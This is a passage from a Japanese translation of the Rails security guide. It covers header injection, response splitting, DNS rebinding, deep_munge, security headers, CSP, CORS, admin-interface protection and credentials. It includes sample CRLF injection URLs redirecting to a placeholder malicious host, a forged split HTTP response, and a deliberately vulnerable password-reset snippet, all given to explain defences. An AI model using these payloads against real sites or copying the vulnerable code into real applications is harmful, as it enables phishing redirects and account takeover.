Railsは、文字列を「Location」ヘッダーフィールドに配置し、ブラウザに302（リダイレクト）ステータスを送信します。悪意のあるユーザーが最初に行うことは、次のようなものです。

```
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
```

そして、（Rubyおよび）Railsのバージョン2.1.2まで（それを除く）、ハッカーは任意のヘッダーフィールドを注入することができます。例えば、次のようにします。

```
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
```

ここで、`%0d%0a`は`\r\n`のURLエンコードであり、Rubyではキャリッジリターンと改行（CRLF）を表します。したがって、2番目の例の結果として得られるHTTPヘッダーは、2番目のLocationヘッダーフィールドが最初のものを上書きするため、次のようになります。

```http
HTTP/1.1 302 Moved Temporarily
(...)
Location: http://www.malicious.tld
```

したがって、ヘッダーインジェクションの攻撃ベクトルは、ヘッダーフィールドにCRLF文字を注入することに基づいています。偽のリダイレクトで攻撃者は何ができるでしょうか？彼らはあなたのサイトと同じように見えるフィッシングサイトにリダイレクトすることができますが、再度ログインを要求し（ログイン資格情報を攻撃者に送信します）、またはそのサイトでブラウザのセキュリティホールを介して悪意のあるソフトウェアをインストールすることができます。Rails 2.1.2では、`redirect_to`メソッドのLocationフィールドにこれらの文字をエスケープします。他のヘッダーフィールドをユーザーの入力で構築する場合は、自分でエスケープするようにしてください。

#### DNSリバインディングとホストヘッダー攻撃

DNSリバインディングは、コンピュータ攻撃の一形態として一般的に使用されるドメイン名の解決を操作する方法です。DNSリバインディングは、同一オリジンポリシーを回避するために、ドメインネームシステム（DNS）を悪用します。それはドメインを別のIPアドレスに再バインドし、変更されたIPアドレスからランダムなコードを実行してRailsアプリケーションを侵害します。

DNSリバインディングや他のホストヘッダー攻撃に対して保護するために、`ActionDispatch::HostAuthorization`ミドルウェアを使用することをお勧めします。開発環境ではデフォルトで有効になっていますが、本番環境や他の環境では許可されるホストのリストを設定することで有効にする必要があります。また、例外を設定し、独自のレスポンスアプリケーションを設定することもできます。

```ruby
Rails.application.config.hosts << "product.com"

Rails.application.config.host_authorization = {
  # /healthcheck/パスへのリクエストをホストチェックから除外する
  exclude: ->(request) { request.path =~ /healthcheck/ }
  # カスタムのRackアプリケーションをレスポンスとして追加
  response_app: -> env do
    [400, { "Content-Type" => "text/plain" }, ["Bad Request"]]
  end
}
```

詳細については、[`ActionDispatch::HostAuthorization`ミドルウェアのドキュメント](/configuring.html#actiondispatch-hostauthorization)を参照してください。

#### レスポンス分割

ヘッダーインジェクションが可能な場合、レスポンス分割も可能です。HTTPでは、ヘッダーブロックの後に2つのCRLFと実際のデータ（通常はHTML）が続きます。レスポンス分割のアイデアは、ヘッダーフィールドに2つのCRLFを注入し、その後に悪意のあるHTMLを含む別のレスポンスを注入することです。レスポンスは次のようになります。

```http
HTTP/1.1 302 Found [最初の標準的な302レスポンス]
Date: Tue, 12 Apr 2005 22:09:07 GMT
Location:Content-Type: text/html


HTTP/1.1 200 OK [攻撃者によって作成された2番目の新しいレスポンスが始まります]
Content-Type: text/html


&lt;html&gt;&lt;font color=red&gt;hey&lt;/font&gt;&lt;/html&gt; [任意の悪意のある入力がリダイレクトされたページとして表示されます]
Keep-Alive: timeout=15, max=100
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html
```

特定の条件下では、これにより悪意のあるHTMLが被害者に表示される場合があります。ただし、これはKeep-Alive接続でのみ機能するようです（多くのブラウザがワンタイム接続を使用しています）。しかし、これに頼ることはできません。_いずれにせよ、これは深刻なバグであり、ヘッダーインジェクション（およびそれによるレスポンス分割）のリスクを排除するために、Railsをバージョン2.0.5または2.1.2に更新する必要があります。_

安全でないクエリ生成
-----------------------

Active Recordがパラメータを解釈する方法と、Rackがクエリパラメータを解析する方法の組み合わせにより、`IS NULL`のwhere句を持つ予期しないデータベースクエリを発行することが可能でした。そのセキュリティ上の問題に対応するために、Railsをデフォルトで安全に保つために`deep_munge`メソッドが導入されました。

もし`deep_munge`が実行されていない場合、攻撃者によって使用される可能性のある脆弱なコードの例は次のとおりです。

```ruby
unless params[:token].nil?
  user = User.find_by_token(params[:token])
  user.reset_password!
end
```

`params[:token]`が`[nil]`、`[nil, nil, ...]`、または`['foo', nil]`のいずれかである場合、`nil`のテストはバイパスされますが、SQLクエリには`IS NULL`または`IN ('foo', NULL)`のwhere句が追加されます。
Railsをデフォルトで安全に保つために、`deep_munge`はいくつかの値を`nil`で置き換えます。以下の表は、リクエストで送信される`JSON`に基づいてパラメータがどのようになるかを示しています。

| JSON                              | パラメータ               |
|-----------------------------------|--------------------------|
| `{ "person": null }`              | `{ :person => nil }`     |
| `{ "person": [] }`                | `{ :person => [] }`     |
| `{ "person": [null] }`            | `{ :person => [] }`     |
| `{ "person": [null, null, ...] }` | `{ :person => [] }`     |
| `{ "person": ["foo", null] }`     | `{ :person => ["foo"] }` |

リスクを認識し、それを処理する方法を知っている場合、アプリケーションを設定して`deep_munge`を無効にすることで、古い動作に戻すことができます。

```ruby
config.action_dispatch.perform_deep_munge = false
```

HTTPセキュリティヘッダー
---------------------

アプリケーションのセキュリティを向上させるために、RailsはHTTPセキュリティヘッダーを返すように設定できます。一部のヘッダーはデフォルトで設定されていますが、他のヘッダーは明示的に設定する必要があります。

### デフォルトのセキュリティヘッダー

デフォルトでは、Railsは次のレスポンスヘッダーを返すように設定されています。アプリケーションは、すべてのHTTPレスポンスに対してこれらのヘッダーを返します。

#### `X-Frame-Options`

[`X-Frame-Options`][]ヘッダーは、ブラウザがページを`<frame>`、`<iframe>`、`<embed>`、`<object>`タグでレンダリングできるかどうかを示します。このヘッダーはデフォルトで`SAMEORIGIN`に設定されており、同じドメインでのフレーミングを許可します。すべてのドメインでフレーミングを許可する場合は、`DENY`に設定するか、このヘッダーを完全に削除します。

#### `X-XSS-Protection`

Railsでは、問題のある旧式のXSSオーディターを無効にするために、デフォルトで`0`に設定されている[非推奨の旧式ヘッダー](https://owasp.org/www-project-secure-headers/#x-xss-protection)です。

#### `X-Content-Type-Options`

[`X-Content-Type-Options`][]ヘッダーは、Railsではデフォルトで`nosniff`に設定されています。これにより、ブラウザがファイルのMIMEタイプを推測するのを防ぎます。

#### `X-Permitted-Cross-Domain-Policies`

このヘッダーはRailsではデフォルトで`none`に設定されています。これにより、Adobe FlashやPDFクライアントが他のドメインにあるページを埋め込むことができなくなります。

#### `Referrer-Policy`

[`Referrer-Policy`][]ヘッダーは、Railsではデフォルトで`strict-origin-when-cross-origin`に設定されています。クロスオリジンのリクエストでは、Refererヘッダーには元の情報のみが送信されます。これにより、パスやクエリ文字列など、フルURLの他の部分からアクセス可能なプライベートデータの漏洩を防ぎます。

#### デフォルトヘッダーの設定

これらのヘッダーはデフォルトで次のように設定されています。

```ruby
config.action_dispatch.default_headers = {
  'X-Frame-Options' => 'SAMEORIGIN',
  'X-XSS-Protection' => '0',
  'X-Content-Type-Options' => 'nosniff',
  'X-Permitted-Cross-Domain-Policies' => 'none',
  'Referrer-Policy' => 'strict-origin-when-cross-origin'
}
```

`config/application.rb`でこれらを上書きしたり、追加のヘッダーを追加したりすることができます。

```ruby
config.action_dispatch.default_headers['X-Frame-Options'] = 'DENY'
config.action_dispatch.default_headers['Header-Name']     = 'Value'
```

または、これらを削除することもできます。

```ruby
config.action_dispatch.default_headers.clear
```

### `Strict-Transport-Security`ヘッダー

HTTP [`Strict-Transport-Security`][]（HTST）レスポンスヘッダーは、ブラウザが現在および将来の接続に対して自動的にHTTPSにアップグレードすることを保証します。

`force_ssl`オプションを有効にすると、このヘッダーがレスポンスに追加されます。

```ruby
  config.force_ssl = true
```

### `Content-Security-Policy`ヘッダー

XSSやインジェクション攻撃から保護するために、アプリケーションに[`Content-Security-Policy`][]レスポンスヘッダーを定義することをお勧めします。Railsは、このヘッダーを設定するためのDSLを提供しています。

適切なイニシャライザでセキュリティポリシーを定義します。

```ruby
# config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy do |policy|
  policy.default_src :self, :https
  policy.font_src    :self, :https, :data
  policy.img_src     :self, :https, :data
  policy.object_src  :none
  policy.script_src  :self, :https
  policy.style_src   :self, :https
  # 違反レポートのためのURIを指定
  policy.report_uri "/csp-violation-report-endpoint"
end
```

グローバルに設定されたポリシーは、リソースごとにオーバーライドすることもできます。

```ruby
class PostsController < ApplicationController
  content_security_policy do |policy|
    policy.upgrade_insecure_requests true
    policy.base_uri "https://www.example.com"
  end
end
```

または、無効にすることもできます。

```ruby
class LegacyPagesController < ApplicationController
  content_security_policy false, only: :index
end
```

マルチテナントアプリケーションでアカウントのサブドメインなど、リクエストごとの値を注入するためにラムダを使用することもできます。

```ruby
class PostsController < ApplicationController
  content_security_policy do |policy|
    policy.base_uri :self, -> { "https://#{current_user.domain}.example.com" }
  end
end
```

#### 違反の報告

指定されたURIに違反を報告するために[`report-uri`][]ディレクティブを有効にします。

```ruby
Rails.application.config.content_security_policy do |policy|
  policy.report_uri "/csp-violation-report-endpoint"
end
```

既存のコードの上にContent Security Policyを実装する場合、ポリシーを強制することなく違反を報告したい場合があります。[`Content-Security-Policy-Report-Only`][]レスポンスヘッダーを設定して、違反のみを報告するようにします。

```ruby
Rails.application.config.content_security_policy_report_only = true
```

または、コントローラでオーバーライドします。

```ruby
class PostsController < ApplicationController
  content_security_policy_report_only only: :index
end
```

#### Nonceの追加

`'unsafe-inline'`を検討している場合は、代わりにノンスを使用することを検討してください。[ノンスは、既存のコードの上にContent Security Policyを実装する場合に、`'unsafe-inline'`よりも大幅な改善を提供します](https://www.w3.org/TR/CSP3/#security-nonces)。
```ruby
# config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy do |policy|
  policy.script_src :self, :https
end

Rails.application.config.content_security_policy_nonce_generator = -> request { SecureRandom.base64(16) }
```

ノンスジェネレータを設定する際にはいくつかのトレードオフが考慮される必要があります。
`SecureRandom.base64(16)`を使用することは、各リクエストごとに新しいランダムなノンスを生成するため、良いデフォルト値です。ただし、このメソッドは[条件付きGETキャッシュ](caching_with_rails.html#conditional-get-support)と互換性がありません。なぜなら、新しいノンスはすべてのリクエストに対して新しいETag値を生成するからです。リクエストごとのランダムなノンスの代わりにセッションIDを使用する方法もあります。

```ruby
Rails.application.config.content_security_policy_nonce_generator = -> request { request.session.id.to_s }
```

この生成方法はETagと互換性がありますが、そのセキュリティはセッションIDが十分にランダムであり、安全でないクッキーで公開されていないことに依存します。

デフォルトでは、ノンスは`script-src`と`style-src`に適用されます。ノンスジェネレータが定義されている場合、`config.content_security_policy_nonce_directives`を使用してノンスを使用するディレクティブを変更できます。

```ruby
Rails.application.config.content_security_policy_nonce_directives = %w(script-src)
```

イニシャライザでノンスジェネレーションが設定されたら、`html_options`の一部として`nonce: true`を渡すことでスクリプトタグに自動的にノンス値を追加できます。

```html+erb
<%= javascript_tag nonce: true do -%>
  alert('Hello, World!');
<% end -%>
```

`javascript_include_tag`でも同じように動作します。

```html+erb
<%= javascript_include_tag "script", nonce: true %>
```

[`csp_meta_tag`](https://api.rubyonrails.org/classes/ActionView/Helpers/CspHelper.html#method-i-csp_meta_tag)ヘルパーを使用して、インラインの`<script>`タグを許可するためのセッションごとのノンス値を持つメタタグ"csp-nonce"を作成します。

```html+erb
<head>
  <%= csp_meta_tag %>
</head>
```

これはRails UJSヘルパーによって動的にロードされるインラインの`<script>`要素を作成するために使用されます。

### `Feature-Policy`ヘッダー

注意：`Feature-Policy`ヘッダーは`Permissions-Policy`に名前が変更されました。`Permissions-Policy`は異なる実装を必要とし、すべてのブラウザでサポートされていません。将来的にこのミドルウェアの名前を変更することを避けるために、新しい名前をミドルウェアに使用しますが、現時点では古いヘッダー名と実装を維持します。

ブラウザの機能の使用を許可またはブロックするために、アプリケーションに[`Feature-Policy`][]レスポンスヘッダーを定義できます。Railsは、ヘッダーを設定するためのDSLを提供しています。

適切なイニシャライザでポリシーを定義します。

```ruby
# config/initializers/permissions_policy.rb
Rails.application.config.permissions_policy do |policy|
  policy.camera      :none
  policy.gyroscope   :none
  policy.microphone  :none
  policy.usb         :none
  policy.fullscreen  :self
  policy.payment     :self, "https://secure.example.com"
end
```

グローバルに設定されたポリシーは、リソースごとにオーバーライドすることができます。

```ruby
class PagesController < ApplicationController
  permissions_policy do |policy|
    policy.geolocation "https://example.com"
  end
end
```


### クロスオリジンリソース共有

ブラウザは、スクリプトから開始されるクロスオリジンのHTTPリクエストを制限します。RailsをAPIとして実行し、フロントエンドアプリを別のドメインで実行する場合、[クロスオリジンリソース共有](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)（CORS）を有効にする必要があります。

CORSを処理するために[Rack CORS](https://github.com/cyu/rack-cors)ミドルウェアを使用できます。`--api`オプションでアプリケーションを生成した場合、Rack CORSは既に設定されている可能性があり、以下の手順はスキップできます。

まず、Gemfileにrack-cors gemを追加します。

```ruby
gem 'rack-cors'
```

次に、ミドルウェアを設定するためのイニシャライザを追加します。

```ruby
# config/initializers/cors.rb
Rails.application.config.middleware.insert_before 0, "Rack::Cors" do
  allow do
    origins 'example.com'

    resource '*',
      headers: :any,
      methods: [:get, :post, :put, :patch, :delete, :options, :head]
  end
end
```

イントラネットと管理セキュリティ
---------------------------

イントラネットと管理インターフェースは、特権アクセスを許可するため、攻撃の対象となりやすいです。これにはいくつかの追加のセキュリティ対策が必要ですが、実際の世界では逆の状況が起こっています。

2007年には、初めてイントラネットから情報を盗むために特別に作られたトロイの木馬が登場しました。具体的には、オンラインの求人ウェブアプリケーションであるMonster.comの「Monster for employers」というウェブサイトです。特別に作られたトロイの木馬は非常に珍しいものであり、リスクは非常に低いですが、それは確かに可能性であり、クライアントホストのセキュリティが重要である例です。ただし、イントラネットおよび管理アプリケーションへの最も高い脅威はXSSとCSRFです。

### クロスサイトスクリプティング

アプリケーションがイントラネットからの悪意のあるユーザー入力を再表示する場合、アプリケーションはXSSの脆弱性に対して脆弱になります。ユーザー名、コメント、スパムレポート、注文先住所など、XSSが発生する可能性のある例は数多くあります。

管理インターフェースまたはイントラネットで入力がサニタイズされていない単一の場所がある場合、アプリケーション全体が脆弱になります。可能な攻撃手法には、特権管理者のクッキーの盗難、管理者のパスワードを盗むためのiframeの注入、ブラウザのセキュリティホールを介して悪意のあるソフトウェアのインストールなどがあります。

XSSに対する対策については、インジェクションセクションを参照してください。

### クロスサイトリクエストフォージェリ
クロスサイトリクエストフォージェリ（CSRF）は、管理者やイントラネットユーザーが行えるすべての操作を攻撃者に許可する、巨大な攻撃手法です。上記でCSRFがどのように機能するかを見てきましたが、以下にはイントラネットや管理者インターフェースで攻撃者が行えるいくつかの例があります。

実際の例として、[CSRFによるルーターの再構成](http://www.h-online.com/security/news/item/Symantec-reports-first-active-attack-on-a-DSL-router-735883.html)があります。攻撃者は、メキシコのユーザーに対してCSRFを含んだ悪意のあるメールを送信しました。そのメールには、ユーザーのためにeカードが待っていると主張する内容がありましたが、同時に画像タグも含まれており、ユーザーのルーター（メキシコで人気のあるモデル）の再構成を行うHTTP-GETリクエストが発生しました。このリクエストにより、メキシコの銀行サイトへのリクエストが攻撃者のサイトにマッピングされるようにDNS設定が変更されました。そのルーターを介して銀行サイトにアクセスしたすべての人は、攻撃者の偽のウェブサイトを見て、クレデンシャル情報を盗まれました。

別の例として、Google Adsenseのメールアドレスとパスワードを変更するものがあります。被害者がGoogle Adsenseにログインしている場合、攻撃者は被害者のクレデンシャル情報を変更することができます。

もう1つの一般的な攻撃手法は、ウェブアプリケーション、ブログ、またはフォーラムにスパムを送り、悪意のあるXSSを広めることです。もちろん、攻撃者はURLの構造を知っている必要がありますが、ほとんどのRailsのURLは非常に直感的であり、オープンソースアプリケーションの管理インターフェースであれば簡単に見つけることができます。攻撃者は、すべての可能な組み合わせを試す悪意のあるIMGタグを含めることで、1,000回の幸運な予測を行うことさえできます。

CSRFに対する対策については、管理インターフェースやイントラネットアプリケーションにおける対策をCSRFセクションで参照してください。

### 追加の注意事項

一般的な管理インターフェースの動作は次のようになります：www.example.com/adminに配置され、Userモデルでadminフラグが設定されている場合にのみアクセスでき、ユーザーの入力を再表示し、管理者が任意のデータを削除/追加/編集できるようにします。以下にいくつかの考えがあります：

* 最悪の場合を考えることは非常に重要です：もし本当にクッキーやユーザーのクレデンシャル情報が誰かに渡った場合、攻撃者の可能性を制限するために管理者インターフェースにロールを導入することができます。また、公開部分のアプリケーションとは異なる特別なログインクレデンシャルを管理者インターフェースに使用することはできませんか。または、非常に重要な操作に対して特別なパスワードを使用することはできませんか？

* 管理者は本当に世界中のどこからでもインターフェースにアクセスする必要がありますか？ログインを一部のソースIPアドレスに制限することを考えてみてください。ユーザーのIPアドレスについては、request.remote_ipを調べることで確認できます。これは完全なセキュリティではありませんが、大きなバリアとなります。ただし、プロキシが使用されている可能性もあることを忘れないでください。

* 管理者インターフェースをadmin.application.comのような特別なサブドメインに配置し、独自のユーザー管理を行う別のアプリケーションにすることもできます。これにより、通常のドメインであるwww.application.comからの管理者クッキーの盗難が不可能になります。これは、ブラウザの同一オリジンポリシーによるものです：www.application.com上の注入（XSS）スクリプトはadmin.application.comのクッキーを読み取ることはできず、その逆も同様です。

環境のセキュリティ
----------------------

このガイドでは、アプリケーションコードと環境をどのようにセキュアにするかについての情報を提供することは範囲外です。ただし、データベースの設定（例：`config/database.yml`）、`credentials.yml`のマスターキー、および他の暗号化されていない秘密情報をセキュアにする必要があります。環境固有のバージョンのこれらのファイルや他の機密情報を使用してアクセスをさらに制限することも検討してください。

### カスタムクレデンシャル

Railsは`config/credentials.yml.enc`に秘密情報を保存し、そのため直接編集することはできません。Railsは`config/master.key`を使用するか、環境変数`ENV["RAILS_MASTER_KEY"]`を参照してクレデンシャルファイルを暗号化します。クレデンシャルファイルは暗号化されているため、マスターキーが安全に保管されている限り、バージョン管理に保存することができます。

デフォルトでは、クレデンシャルファイルにはアプリケーションの`secret_key_base`が含まれています。外部APIのアクセスキーなど、他の秘密情報を保存するためにも使用することができます。

クレデンシャルファイルを編集するには、`bin/rails credentials:edit`を実行します。このコマンドはクレデンシャルファイルが存在しない場合には作成します。また、マスターキーが定義されていない場合には`config/master.key`も作成します。

クレデンシャルファイルに格納されている秘密情報は、`Rails.application.credentials`を介してアクセスできます。
たとえば、次のような復号化された`config/credentials.yml.enc`がある場合：

```yaml
secret_key_base: 3b7cd72...
some_api_key: SOMEKEY
system:
  access_key_id: 1234AB
```

`Rails.application.credentials.some_api_key`は`"SOMEKEY"`を返します。`Rails.application.credentials.system.access_key_id`は`"1234AB"`を返します。
もしキーが空白の場合に例外を発生させたい場合は、bangバージョンを使用できます：

```ruby
# some_api_keyが空白の場合...
Rails.application.credentials.some_api_key! # => KeyError: :some_api_key is blank
```

TIP: `bin/rails credentials:help`でcredentialsについて詳しく学びましょう。

WARNING: マスターキーを安全に保管してください。マスターキーをコミットしないでください。

依存関係の管理とCVE
---------------------

セキュリティの問題を含め、新しいバージョンの使用を奨励するために依存関係を更新することはありません。これは、アプリケーションの所有者が手動でジェムを更新する必要があるためです。脆弱性のある依存関係を安全に更新するには、`bundle update --conservative gem_name`を使用してください。

追加リソース
--------------------

セキュリティの状況は変化するため、最新情報を把握することが重要です。新しい脆弱性を見逃すと、深刻な問題につながる可能性があります。以下は(Rails)セキュリティに関する追加のリソースです：

* Railsセキュリティのメーリングリストに登録する：[mailing list](https://discuss.rubyonrails.org/c/security-announcements/9)。
* [Brakeman - Railsセキュリティスキャナー](https://brakemanscanner.org/) - Railsアプリケーションの静的セキュリティ分析を実行するためのツール。
* [MozillaのWebセキュリティガイドライン](https://infosec.mozilla.org/guidelines/web_security.html) - コンテンツセキュリティポリシー、HTTPヘッダー、クッキー、TLSの設定などに関する推奨事項。
* [良いセキュリティブログ](https://owasp.org/)および[クロスサイトスクリプティングチートシート](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md)。
[`config.action_controller.default_protect_from_forgery`]: configuring.html#config-action-controller-default-protect-from-forgery
[`csrf_meta_tags`]: https://api.rubyonrails.org/classes/ActionView/Helpers/CsrfHelper.html#method-i-csrf_meta_tags
[`config.filter_parameters`]: configuring.html#config-filter-parameters
[`sanitize_sql`]: https://api.rubyonrails.org/classes/ActiveRecord/Sanitization/ClassMethods.html#method-i-sanitize_sql
[`X-Frame-Options`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
[`X-Content-Type-Options`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
[`Referrer-Policy`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
[`Strict-Transport-Security`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
[`Content-Security-Policy`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy
[`Content-Security-Policy-Report-Only`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only
[`report-uri`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri
[`Feature-Policy`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Feature-Policy
